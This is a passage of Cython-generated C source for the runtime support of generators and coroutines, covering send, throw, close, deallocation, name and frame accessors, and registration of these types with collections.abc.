        PyObject* args = __Pyx_PyObject_GetAttrStr(ev, __pyx_n_s_args);
        Py_DECREF(ev);
        if (likely(args)) {
            value = PySequence_GetItem(args, 0);
            Py_DECREF(args);
        }
        if (unlikely(!value)) {
            __Pyx_ErrRestore(NULL, NULL, NULL);
            Py_INCREF(Py_None);
            value = Py_None;
        }
    }
#endif
    *pvalue = value;
    return 0;
}
static CYTHON_INLINE
void __Pyx_Coroutine_ExceptionClear(__Pyx_ExcInfoStruct *exc_state) {
    PyObject *t, *v, *tb;
    t = exc_state->exc_type;
    v = exc_state->exc_value;
    tb = exc_state->exc_traceback;
    exc_state->exc_type = NULL;
    exc_state->exc_value = NULL;
    exc_state->exc_traceback = NULL;
    Py_XDECREF(t);
    Py_XDECREF(v);
    Py_XDECREF(tb);
}
#define __Pyx_Coroutine_AlreadyRunningError(gen)  (__Pyx__Coroutine_AlreadyRunningError(gen), (PyObject*)NULL)
static void __Pyx__Coroutine_AlreadyRunningError(CYTHON_UNUSED __pyx_CoroutineObject *gen) {
    const char *msg;
    if ((0)) {
    #ifdef __Pyx_Coroutine_USED
    } else if (__Pyx_Coroutine_Check((PyObject*)gen)) {
        msg = "coroutine already executing";
    #endif
    #ifdef __Pyx_AsyncGen_USED
    } else if (__Pyx_AsyncGen_CheckExact((PyObject*)gen)) {
        msg = "async generator already executing";
    #endif
    } else {
        msg = "generator already executing";
    }
    PyErr_SetString(PyExc_ValueError, msg);
}
#define __Pyx_Coroutine_NotStartedError(gen)  (__Pyx__Coroutine_NotStartedError(gen), (PyObject*)NULL)
static void __Pyx__Coroutine_NotStartedError(CYTHON_UNUSED PyObject *gen) {
    const char *msg;
    if ((0)) {
    #ifdef __Pyx_Coroutine_USED
    } else if (__Pyx_Coroutine_Check(gen)) {
        msg = "can't send non-None value to a just-started coroutine";
    #endif
    #ifdef __Pyx_AsyncGen_USED
    } else if (__Pyx_AsyncGen_CheckExact(gen)) {
        msg = "can't send non-None value to a just-started async generator";
    #endif
    } else {
        msg = "can't send non-None value to a just-started generator";
    }
    PyErr_SetString(PyExc_TypeError, msg);
}
#define __Pyx_Coroutine_AlreadyTerminatedError(gen, value, closing)  (__Pyx__Coroutine_AlreadyTerminatedError(gen, value, closing), (PyObject*)NULL)
static void __Pyx__Coroutine_AlreadyTerminatedError(CYTHON_UNUSED PyObject *gen, PyObject *value, CYTHON_UNUSED int closing) {
    #ifdef __Pyx_Coroutine_USED
    if (!closing && __Pyx_Coroutine_Check(gen)) {
        PyErr_SetString(PyExc_RuntimeError, "cannot reuse already awaited coroutine");
    } else
    #endif
    if (value) {
        #ifdef __Pyx_AsyncGen_USED
        if (__Pyx_AsyncGen_CheckExact(gen))
            PyErr_SetNone(__Pyx_PyExc_StopAsyncIteration);
        else
        #endif
        PyErr_SetNone(PyExc_StopIteration);
    }
}
static
PyObject *__Pyx_Coroutine_SendEx(__pyx_CoroutineObject *self, PyObject *value, int closing) {
    __Pyx_PyThreadState_declare
    PyThreadState *tstate;
    __Pyx_ExcInfoStruct *exc_state;
    PyObject *retval;
    assert(!self->is_running);
    if (unlikely(self->resume_label == 0)) {
        if (unlikely(value && value != Py_None)) {
            return __Pyx_Coroutine_NotStartedError((PyObject*)self);
        }
    }
    if (unlikely(self->resume_label == -1)) {
        return __Pyx_Coroutine_AlreadyTerminatedError((PyObject*)self, value, closing);
    }
#if CYTHON_FAST_THREAD_STATE
    __Pyx_PyThreadState_assign
    tstate = __pyx_tstate;
#else
    tstate = __Pyx_PyThreadState_Current;
#endif
    exc_state = &self->gi_exc_state;
    if (exc_state->exc_type) {
        #if CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_PYSTON
        #else
        if (exc_state->exc_traceback) {
            PyTracebackObject *tb = (PyTracebackObject *) exc_state->exc_traceback;
            PyFrameObject *f = tb->tb_frame;
            assert(f->f_back == NULL);
            #if PY_VERSION_HEX >= 0x030B00A1
            f->f_back = PyThreadState_GetFrame(tstate);
            #else
            Py_XINCREF(tstate->frame);
            f->f_back = tstate->frame;
            #endif
        }
        #endif
    }
#if CYTHON_USE_EXC_INFO_STACK
    exc_state->previous_item = tstate->exc_info;
    tstate->exc_info = exc_state;
#else
    if (exc_state->exc_type) {
        __Pyx_ExceptionSwap(&exc_state->exc_type, &exc_state->exc_value, &exc_state->exc_traceback);
    } else {
        __Pyx_Coroutine_ExceptionClear(exc_state);
        __Pyx_ExceptionSave(&exc_state->exc_type, &exc_state->exc_value, &exc_state->exc_traceback);
    }
#endif
    self->is_running = 1;
    retval = self->body((PyObject *) self, tstate, value);
    self->is_running = 0;
#if CYTHON_USE_EXC_INFO_STACK
    exc_state = &self->gi_exc_state;
    tstate->exc_info = exc_state->previous_item;
    exc_state->previous_item = NULL;
    __Pyx_Coroutine_ResetFrameBackpointer(exc_state);
#endif
    return retval;
}
static CYTHON_INLINE void __Pyx_Coroutine_ResetFrameBackpointer(__Pyx_ExcInfoStruct *exc_state) {
    PyObject *exc_tb = exc_state->exc_traceback;
    if (likely(exc_tb)) {
#if CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_PYSTON
#else
        PyTracebackObject *tb = (PyTracebackObject *) exc_tb;
        PyFrameObject *f = tb->tb_frame;
        Py_CLEAR(f->f_back);
#endif
    }
}
static CYTHON_INLINE
PyObject *__Pyx_Coroutine_MethodReturn(CYTHON_UNUSED PyObject* gen, PyObject *retval) {
    if (unlikely(!retval)) {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        if (!__Pyx_PyErr_Occurred()) {
            PyObject *exc = PyExc_StopIteration;
            #ifdef __Pyx_AsyncGen_USED
            if (__Pyx_AsyncGen_CheckExact(gen))
                exc = __Pyx_PyExc_StopAsyncIteration;
            #endif
            __Pyx_PyErr_SetNone(exc);
        }
    }
    return retval;
}
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03030000 && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
static CYTHON_INLINE
PyObject *__Pyx_PyGen_Send(PyGenObject *gen, PyObject *arg) {
#if PY_VERSION_HEX <= 0x030A00A1
    return _PyGen_Send(gen, arg);
#else
    PyObject *result;
    if (PyIter_Send((PyObject*)gen, arg ? arg : Py_None, &result) == PYGEN_RETURN) {
        if (PyAsyncGen_CheckExact(gen)) {
            assert(result == Py_None);
            PyErr_SetNone(PyExc_StopAsyncIteration);
        }
        else if (result == Py_None) {
            PyErr_SetNone(PyExc_StopIteration);
        }
        else {
            _PyGen_SetStopIterationValue(result);
        }
        Py_CLEAR(result);
    }
    return result;
#endif
}
#endif
static CYTHON_INLINE
PyObject *__Pyx_Coroutine_FinishDelegation(__pyx_CoroutineObject *gen) {
    PyObject *ret;
    PyObject *val = NULL;
    __Pyx_Coroutine_Undelegate(gen);
    __Pyx_PyGen__FetchStopIterationValue(__Pyx_PyThreadState_Current, &val);
    ret = __Pyx_Coroutine_SendEx(gen, val, 0);
    Py_XDECREF(val);
    return ret;
}
static PyObject *__Pyx_Coroutine_Send(PyObject *self, PyObject *value) {
    PyObject *retval;
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject*) self;
    PyObject *yf = gen->yieldfrom;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        PyObject *ret;
        gen->is_running = 1;
        #ifdef __Pyx_Generator_USED
        if (__Pyx_Generator_CheckExact(yf)) {
            ret = __Pyx_Coroutine_Send(yf, value);
        } else
        #endif
        #ifdef __Pyx_Coroutine_USED
        if (__Pyx_Coroutine_Check(yf)) {
            ret = __Pyx_Coroutine_Send(yf, value);
        } else
        #endif
        #ifdef __Pyx_AsyncGen_USED
        if (__pyx_PyAsyncGenASend_CheckExact(yf)) {
            ret = __Pyx_async_gen_asend_send(yf, value);
        } else
        #endif
        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03030000 && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
        if (PyGen_CheckExact(yf)) {
            ret = __Pyx_PyGen_Send((PyGenObject*)yf, value == Py_None ? NULL : value);
        } else
        #endif
        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03050000 && defined(PyCoro_CheckExact) && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
        if (PyCoro_CheckExact(yf)) {
            ret = __Pyx_PyGen_Send((PyGenObject*)yf, value == Py_None ? NULL : value);
        } else
        #endif
        {
            if (value == Py_None)
                ret = Py_TYPE(yf)->tp_iternext(yf);
            else
                ret = __Pyx_PyObject_CallMethod1(yf, __pyx_n_s_send, value);
        }
        gen->is_running = 0;
        if (likely(ret)) {
            return ret;
        }
        retval = __Pyx_Coroutine_FinishDelegation(gen);
    } else {
        retval = __Pyx_Coroutine_SendEx(gen, value, 0);
    }
    return __Pyx_Coroutine_MethodReturn(self, retval);
}
static int __Pyx_Coroutine_CloseIter(__pyx_CoroutineObject *gen, PyObject *yf) {
    PyObject *retval = NULL;
    int err = 0;
    #ifdef __Pyx_Generator_USED
    if (__Pyx_Generator_CheckExact(yf)) {
        retval = __Pyx_Coroutine_Close(yf);
        if (!retval)
            return -1;
    } else
    #endif
    #ifdef __Pyx_Coroutine_USED
    if (__Pyx_Coroutine_Check(yf)) {
        retval = __Pyx_Coroutine_Close(yf);
        if (!retval)
            return -1;
    } else
    if (__Pyx_CoroutineAwait_CheckExact(yf)) {
        retval = __Pyx_CoroutineAwait_Close((__pyx_CoroutineAwaitObject*)yf, NULL);
        if (!retval)
            return -1;
    } else
    #endif
    #ifdef __Pyx_AsyncGen_USED
    if (__pyx_PyAsyncGenASend_CheckExact(yf)) {
        retval = __Pyx_async_gen_asend_close(yf, NULL);
    } else
    if (__pyx_PyAsyncGenAThrow_CheckExact(yf)) {
        retval = __Pyx_async_gen_athrow_close(yf, NULL);
    } else
    #endif
    {
        PyObject *meth;
        gen->is_running = 1;
        meth = __Pyx_PyObject_GetAttrStr(yf, __pyx_n_s_close);
        if (unlikely(!meth)) {
            if (!PyErr_ExceptionMatches(PyExc_AttributeError)) {
                PyErr_WriteUnraisable(yf);
            }
            PyErr_Clear();
        } else {
            retval = PyObject_CallFunction(meth, NULL);
            Py_DECREF(meth);
            if (!retval)
                err = -1;
        }
        gen->is_running = 0;
    }
    Py_XDECREF(retval);
    return err;
}
static PyObject *__Pyx_Generator_Next(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject*) self;
    PyObject *yf = gen->yieldfrom;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        PyObject *ret;
        gen->is_running = 1;
        #ifdef __Pyx_Generator_USED
        if (__Pyx_Generator_CheckExact(yf)) {
            ret = __Pyx_Generator_Next(yf);
        } else
        #endif
        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03030000 && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
        if (PyGen_CheckExact(yf)) {
            ret = __Pyx_PyGen_Send((PyGenObject*)yf, NULL);
        } else
        #endif
        #ifdef __Pyx_Coroutine_USED
        if (__Pyx_Coroutine_Check(yf)) {
            ret = __Pyx_Coroutine_Send(yf, Py_None);
        } else
        #endif
            ret = Py_TYPE(yf)->tp_iternext(yf);
        gen->is_running = 0;
        if (likely(ret)) {
            return ret;
        }
        return __Pyx_Coroutine_FinishDelegation(gen);
    }
    return __Pyx_Coroutine_SendEx(gen, Py_None, 0);
}
static PyObject *__Pyx_Coroutine_Close_Method(PyObject *self, CYTHON_UNUSED PyObject *arg) {
    return __Pyx_Coroutine_Close(self);
}
static PyObject *__Pyx_Coroutine_Close(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    PyObject *retval, *raised_exception;
    PyObject *yf = gen->yieldfrom;
    int err = 0;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        Py_INCREF(yf);
        err = __Pyx_Coroutine_CloseIter(gen, yf);
        __Pyx_Coroutine_Undelegate(gen);
        Py_DECREF(yf);
    }
    if (err == 0)
        PyErr_SetNone(PyExc_GeneratorExit);
    retval = __Pyx_Coroutine_SendEx(gen, NULL, 1);
    if (unlikely(retval)) {
        const char *msg;
        Py_DECREF(retval);
        if ((0)) {
        #ifdef __Pyx_Coroutine_USED
        } else if (__Pyx_Coroutine_Check(self)) {
            msg = "coroutine ignored GeneratorExit";
        #endif
        #ifdef __Pyx_AsyncGen_USED
        } else if (__Pyx_AsyncGen_CheckExact(self)) {
#if PY_VERSION_HEX < 0x03060000
            msg = "async generator ignored GeneratorExit - might require Python 3.6+ finalisation (PEP 525)";
#else
            msg = "async generator ignored GeneratorExit";
#endif
        #endif
        } else {
            msg = "generator ignored GeneratorExit";
        }
        PyErr_SetString(PyExc_RuntimeError, msg);
        return NULL;
    }
    raised_exception = PyErr_Occurred();
    if (likely(!raised_exception || __Pyx_PyErr_GivenExceptionMatches2(raised_exception, PyExc_GeneratorExit, PyExc_StopIteration))) {
        if (raised_exception) PyErr_Clear();
        Py_INCREF(Py_None);
        return Py_None;
    }
    return NULL;
}
static PyObject *__Pyx__Coroutine_Throw(PyObject *self, PyObject *typ, PyObject *val, PyObject *tb,
                                        PyObject *args, int close_on_genexit) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    PyObject *yf = gen->yieldfrom;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        PyObject *ret;
        Py_INCREF(yf);
        if (__Pyx_PyErr_GivenExceptionMatches(typ, PyExc_GeneratorExit) && close_on_genexit) {
            int err = __Pyx_Coroutine_CloseIter(gen, yf);
            Py_DECREF(yf);
            __Pyx_Coroutine_Undelegate(gen);
            if (err < 0)
                return __Pyx_Coroutine_MethodReturn(self, __Pyx_Coroutine_SendEx(gen, NULL, 0));
            goto throw_here;
        }
        gen->is_running = 1;
        if (0
        #ifdef __Pyx_Generator_USED
            || __Pyx_Generator_CheckExact(yf)
        #endif
        #ifdef __Pyx_Coroutine_USED
            || __Pyx_Coroutine_Check(yf)
        #endif
            ) {
            ret = __Pyx__Coroutine_Throw(yf, typ, val, tb, args, close_on_genexit);
        #ifdef __Pyx_Coroutine_USED
        } else if (__Pyx_CoroutineAwait_CheckExact(yf)) {
            ret = __Pyx__Coroutine_Throw(((__pyx_CoroutineAwaitObject*)yf)->coroutine, typ, val, tb, args, close_on_genexit);
        #endif
        } else {
            PyObject *meth = __Pyx_PyObject_GetAttrStr(yf, __pyx_n_s_throw);
            if (unlikely(!meth)) {
                Py_DECREF(yf);
                if (!PyErr_ExceptionMatches(PyExc_AttributeError)) {
                    gen->is_running = 0;
                    return NULL;
                }
                PyErr_Clear();
                __Pyx_Coroutine_Undelegate(gen);
                gen->is_running = 0;
                goto throw_here;
            }
            if (likely(args)) {
                ret = PyObject_CallObject(meth, args);
            } else {
                ret = PyObject_CallFunctionObjArgs(meth, typ, val, tb, NULL);
            }
            Py_DECREF(meth);
        }
        gen->is_running = 0;
        Py_DECREF(yf);
        if (!ret) {
            ret = __Pyx_Coroutine_FinishDelegation(gen);
        }
        return __Pyx_Coroutine_MethodReturn(self, ret);
    }
throw_here:
    __Pyx_Raise(typ, val, tb, NULL);
    return __Pyx_Coroutine_MethodReturn(self, __Pyx_Coroutine_SendEx(gen, NULL, 0));
}
static PyObject *__Pyx_Coroutine_Throw(PyObject *self, PyObject *args) {
    PyObject *typ;
    PyObject *val = NULL;
    PyObject *tb = NULL;
    if (!PyArg_UnpackTuple(args, (char *)"throw", 1, 3, &typ, &val, &tb))
        return NULL;
    return __Pyx__Coroutine_Throw(self, typ, val, tb, args, 1);
}
static CYTHON_INLINE int __Pyx_Coroutine_traverse_excstate(__Pyx_ExcInfoStruct *exc_state, visitproc visit, void *arg) {
    Py_VISIT(exc_state->exc_type);
    Py_VISIT(exc_state->exc_value);
    Py_VISIT(exc_state->exc_traceback);
    return 0;
}
static int __Pyx_Coroutine_traverse(__pyx_CoroutineObject *gen, visitproc visit, void *arg) {
    Py_VISIT(gen->closure);
    Py_VISIT(gen->classobj);
    Py_VISIT(gen->yieldfrom);
    return __Pyx_Coroutine_traverse_excstate(&gen->gi_exc_state, visit, arg);
}
static int __Pyx_Coroutine_clear(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    Py_CLEAR(gen->closure);
    Py_CLEAR(gen->classobj);
    Py_CLEAR(gen->yieldfrom);
    __Pyx_Coroutine_ExceptionClear(&gen->gi_exc_state);
#ifdef __Pyx_AsyncGen_USED
    if (__Pyx_AsyncGen_CheckExact(self)) {
        Py_CLEAR(((__pyx_PyAsyncGenObject*)gen)->ag_finalizer);
    }
#endif
    Py_CLEAR(gen->gi_code);
    Py_CLEAR(gen->gi_frame);
    Py_CLEAR(gen->gi_name);
    Py_CLEAR(gen->gi_qualname);
    Py_CLEAR(gen->gi_modulename);
    return 0;
}
static void __Pyx_Coroutine_dealloc(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    PyObject_GC_UnTrack(gen);
    if (gen->gi_weakreflist != NULL)
        PyObject_ClearWeakRefs(self);
    if (gen->resume_label >= 0) {
        PyObject_GC_Track(self);
#if PY_VERSION_HEX >= 0x030400a1 && CYTHON_USE_TP_FINALIZE
        if (PyObject_CallFinalizerFromDealloc(self))
#else
        Py_TYPE(gen)->tp_del(self);
        if (Py_REFCNT(self) > 0)
#endif
        {
            return;
        }
        PyObject_GC_UnTrack(self);
    }
#ifdef __Pyx_AsyncGen_USED
    if (__Pyx_AsyncGen_CheckExact(self)) {
        /* We have to handle this case for asynchronous generators
           right here, because this code has to be between UNTRACK
           and GC_Del. */
        Py_CLEAR(((__pyx_PyAsyncGenObject*)self)->ag_finalizer);
    }
#endif
    __Pyx_Coroutine_clear(self);
    PyObject_GC_Del(gen);
}
static void __Pyx_Coroutine_del(PyObject *self) {
    PyObject *error_type, *error_value, *error_traceback;
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    __Pyx_PyThreadState_declare
    if (gen->resume_label < 0) {
        return;
    }
#if !CYTHON_USE_TP_FINALIZE
    assert(self->ob_refcnt == 0);
    __Pyx_SET_REFCNT(self, 1);
#endif
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&error_type, &error_value, &error_traceback);
#ifdef __Pyx_AsyncGen_USED
    if (__Pyx_AsyncGen_CheckExact(self)) {
        __pyx_PyAsyncGenObject *agen = (__pyx_PyAsyncGenObject*)self;
        PyObject *finalizer = agen->ag_finalizer;
        if (finalizer && !agen->ag_closed) {
            PyObject *res = __Pyx_PyObject_CallOneArg(finalizer, self);
            if (unlikely(!res)) {
                PyErr_WriteUnraisable(self);
            } else {
                Py_DECREF(res);
            }
            __Pyx_ErrRestore(error_type, error_value, error_traceback);
            return;
        }
    }
#endif
    if (unlikely(gen->resume_label == 0 && !error_value)) {
#ifdef __Pyx_Coroutine_USED
#ifdef __Pyx_Generator_USED
    if (!__Pyx_Generator_CheckExact(self))
#endif
        {
        PyObject_GC_UnTrack(self);
#if PY_MAJOR_VERSION >= 3  || defined(PyErr_WarnFormat)
        if (unlikely(PyErr_WarnFormat(PyExc_RuntimeWarning, 1, "coroutine '%.50S' was never awaited", gen->gi_qualname) < 0))
            PyErr_WriteUnraisable(self);
#else
        {PyObject *msg;
        char *cmsg;
        #if CYTHON_COMPILING_IN_PYPY
        msg = NULL;
        cmsg = (char*) "coroutine was never awaited";
        #else
        char *cname;
        PyObject *qualname;
        qualname = gen->gi_qualname;
        cname = PyString_AS_STRING(qualname);
        msg = PyString_FromFormat("coroutine '%.50s' was never awaited", cname);
        if (unlikely(!msg)) {
            PyErr_Clear();
            cmsg = (char*) "coroutine was never awaited";
        } else {
            cmsg = PyString_AS_STRING(msg);
        }
        #endif
        if (unlikely(PyErr_WarnEx(PyExc_RuntimeWarning, cmsg, 1) < 0))
            PyErr_WriteUnraisable(self);
        Py_XDECREF(msg);}
#endif
        PyObject_GC_Track(self);
        }
#endif
    } else {
        PyObject *res = __Pyx_Coroutine_Close(self);
        if (unlikely(!res)) {
            if (PyErr_Occurred())
                PyErr_WriteUnraisable(self);
        } else {
            Py_DECREF(res);
        }
    }
    __Pyx_ErrRestore(error_type, error_value, error_traceback);
#if !CYTHON_USE_TP_FINALIZE
    assert(Py_REFCNT(self) > 0);
    if (--self->ob_refcnt == 0) {
        return;
    }
    {
        Py_ssize_t refcnt = Py_REFCNT(self);
        _Py_NewReference(self);
        __Pyx_SET_REFCNT(self, refcnt);
    }
#if CYTHON_COMPILING_IN_CPYTHON
    assert(PyType_IS_GC(Py_TYPE(self)) &&
           _Py_AS_GC(self)->gc.gc_refs != _PyGC_REFS_UNTRACKED);
    _Py_DEC_REFTOTAL;
#endif
#ifdef COUNT_ALLOCS
    --Py_TYPE(self)->tp_frees;
    --Py_TYPE(self)->tp_allocs;
#endif
#endif
}
static PyObject *
__Pyx_Coroutine_get_name(__pyx_CoroutineObject *self, CYTHON_UNUSED void *context)
{
    PyObject *name = self->gi_name;
    if (unlikely(!name)) name = Py_None;
    Py_INCREF(name);
    return name;
}
static int
__Pyx_Coroutine_set_name(__pyx_CoroutineObject *self, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__name__ must be set to a string object");
        return -1;
    }
    tmp = self->gi_name;
    Py_INCREF(value);
    self->gi_name = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_Coroutine_get_qualname(__pyx_CoroutineObject *self, CYTHON_UNUSED void *context)
{
    PyObject *name = self->gi_qualname;
    if (unlikely(!name)) name = Py_None;
    Py_INCREF(name);
    return name;
}
static int
__Pyx_Coroutine_set_qualname(__pyx_CoroutineObject *self, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__qualname__ must be set to a string object");
        return -1;
    }
    tmp = self->gi_qualname;
    Py_INCREF(value);
    self->gi_qualname = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_Coroutine_get_frame(__pyx_CoroutineObject *self, CYTHON_UNUSED void *context)
{
    PyObject *frame = self->gi_frame;
    if (!frame) {
        if (unlikely(!self->gi_code)) {
            Py_RETURN_NONE;
        }
        frame = (PyObject *) PyFrame_New(
            PyThreadState_Get(),            /*PyThreadState *tstate,*/
            (PyCodeObject*) self->gi_code,  /*PyCodeObject *code,*/
            __pyx_d,                 /*PyObject *globals,*/
            0                               /*PyObject *locals*/
        );
        if (unlikely(!frame))
            return NULL;
        self->gi_frame = frame;
    }
    Py_INCREF(frame);
    return frame;
}
static __pyx_CoroutineObject *__Pyx__Coroutine_New(
            PyTypeObject* type, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
            PyObject *name, PyObject *qualname, PyObject *module_name) {
    __pyx_CoroutineObject *gen = PyObject_GC_New(__pyx_CoroutineObject, type);
    if (unlikely(!gen))
        return NULL;
    return __Pyx__Coroutine_NewInit(gen, body, code, closure, name, qualname, module_name);
}
static __pyx_CoroutineObject *__Pyx__Coroutine_NewInit(
            __pyx_CoroutineObject *gen, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
            PyObject *name, PyObject *qualname, PyObject *module_name) {
    gen->body = body;
    gen->closure = closure;
    Py_XINCREF(closure);
    gen->is_running = 0;
    gen->resume_label = 0;
    gen->classobj = NULL;
    gen->yieldfrom = NULL;
    gen->gi_exc_state.exc_type = NULL;
    gen->gi_exc_state.exc_value = NULL;
    gen->gi_exc_state.exc_traceback = NULL;
#if CYTHON_USE_EXC_INFO_STACK
    gen->gi_exc_state.previous_item = NULL;
#endif
    gen->gi_weakreflist = NULL;
    Py_XINCREF(qualname);
    gen->gi_qualname = qualname;
    Py_XINCREF(name);
    gen->gi_name = name;
    Py_XINCREF(module_name);
    gen->gi_modulename = module_name;
    Py_XINCREF(code);
    gen->gi_code = code;
    gen->gi_frame = NULL;
    PyObject_GC_Track(gen);
    return gen;
}

/* PatchModuleWithCoroutine */
    static PyObject* __Pyx_Coroutine_patch_module(PyObject* module, const char* py_code) {
#if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
    int result;
    PyObject *globals, *result_obj;
    globals = PyDict_New();  if (unlikely(!globals)) goto ignore;
    result = PyDict_SetItemString(globals, "_cython_coroutine_type",
    #ifdef __Pyx_Coroutine_USED
        (PyObject*)__pyx_CoroutineType);
    #else
        Py_None);
    #endif
    if (unlikely(result < 0)) goto ignore;
    result = PyDict_SetItemString(globals, "_cython_generator_type",
    #ifdef __Pyx_Generator_USED
        (PyObject*)__pyx_GeneratorType);
    #else
        Py_None);
    #endif
    if (unlikely(result < 0)) goto ignore;
    if (unlikely(PyDict_SetItemString(globals, "_module", module) < 0)) goto ignore;
    if (unlikely(PyDict_SetItemString(globals, "__builtins__", __pyx_b) < 0)) goto ignore;
    result_obj = PyRun_String(py_code, Py_file_input, globals, globals);
    if (unlikely(!result_obj)) goto ignore;
    Py_DECREF(result_obj);
    Py_DECREF(globals);
    return module;
ignore:
    Py_XDECREF(globals);
    PyErr_WriteUnraisable(module);
    if (unlikely(PyErr_WarnEx(PyExc_RuntimeWarning, "Cython module failed to patch module with custom type", 1) < 0)) {
        Py_DECREF(module);
        module = NULL;
    }
#else
    py_code++;
#endif
    return module;
}

/* PatchGeneratorABC */
    #ifndef CYTHON_REGISTER_ABCS
#define CYTHON_REGISTER_ABCS 1
#endif
#if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
static PyObject* __Pyx_patch_abc_module(PyObject *module);
static PyObject* __Pyx_patch_abc_module(PyObject *module) {
    module = __Pyx_Coroutine_patch_module(
        module, ""
"if _cython_generator_type is not None:\n"
"    try: Generator = _module.Generator\n"
"    except AttributeError: pass\n"
"    else: Generator.register(_cython_generator_type)\n"
"if _cython_coroutine_type is not None:\n"
"    try: Coroutine = _module.Coroutine\n"
"    except AttributeError: pass\n"
"    else: Coroutine.register(_cython_coroutine_type)\n"
    );
    return module;
}
#endif
static int __Pyx_patch_abc(void) {
#if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
    static int abc_patched = 0;
    if (CYTHON_REGISTER_ABCS && !abc_patched) {
        PyObject *module;
        module = PyImport_ImportModule((PY_MAJOR_VERSION >= 3) ? "collections.abc" : "collections");
        if (!module) {
            PyErr_WriteUnraisable(NULL);
            if (unlikely(PyErr_WarnEx(PyExc_RuntimeWarning,
                    ((PY_MAJOR_VERSION >= 3) ?
                        "Cython module failed to register with collections.abc module" :
                        "Cython module failed to register with collections module"), 1) < 0)) {
                return -1;
            }
        } else {
            module = __Pyx_patch_abc_module(module);
            abc_patched = 1;
            if (unlikely(!module))
                return -1;
            Py_DECREF(module);
        }
        module = PyImport_ImportModule("backports_abc");
        if (module) {
            module = __Pyx_patch_abc_module(module);
            Py_XDECREF(module);
        }
        if (!module) {
            PyErr_Clear();
        }
    }
#else
    if ((0)) __Pyx_Coroutine_patch_module(NULL, NULL);
#endif
    return 0;
}

/* Generator */
    static PyMethodDef __pyx_Generator_methods[] = {
    {"send", (PyCFunction) __Pyx_Coroutine_Send, METH_O,
     (char*) PyDoc_STR("send(arg) -> send 'arg' into generator,\nreturn next yielded value or raise StopIteration.")},
    {"throw", (PyCFunction) __Pyx_Coroutine_Throw, METH_VARARGS,
     (char*) PyDoc_STR("throw(typ[,val[,tb]]) -> raise exception in generator,\nreturn next yielded value or raise StopIteration.")},
    {"close", (PyCFunction) __Pyx_Coroutine_Close_Method, METH_NOARGS,
     (char*) PyDoc_STR("close() -> raise GeneratorExit inside generator.")},
    {0, 0, 0, 0}
};
static PyMemberDef __pyx_Generator_memberlist[] = {
    {(char *) "gi_running", T_BOOL, offsetof(__pyx_CoroutineObject, is_running), READONLY, NULL},
    {(char*) "gi_yieldfrom", T_OBJECT, offsetof(__pyx_CoroutineObject, yieldfrom), READONLY,
     (char*) PyDoc_STR("object being iterated by 'yield from', or None")},
    {(char*) "gi_code", T_OBJECT, offsetof(__pyx_CoroutineObject, gi_code), READONLY, NULL},
    {0, 0, 0, 0, 0}
};
static PyGetSetDef __pyx_Generator_getsets[] = {
    {(char *) "__name__", (getter)__Pyx_Coroutine_get_name, (setter)__Pyx_Coroutine_set_name,
     (char*) PyDoc_STR("name of the generator"), 0},
    {(char *) "__qualname__", (getter)__Pyx_Coroutine_get_qualname, (setter)__Pyx_Coroutine_set_qualname,
     (char*) PyDoc_STR("qualified name of the generator"), 0},
    {(char *) "gi_frame", (getter)__Pyx_Coroutine_get_frame, NULL,
     (char*) PyDoc_STR("Frame of the generator"), 0},
    {0, 0, 0, 0, 0}
};
static PyTypeObject __pyx_GeneratorType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    "generator",
    sizeof(__pyx_CoroutineObject),
    0,
    (destructor) __Pyx_Coroutine_dealloc,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC | Py_TPFLAGS_HAVE_FINALIZE,
    0,
    (traverseproc) __Pyx_Coroutine_traverse,
    0,
    0,
    offsetof(__pyx_CoroutineObject, gi_weakreflist),
    0,
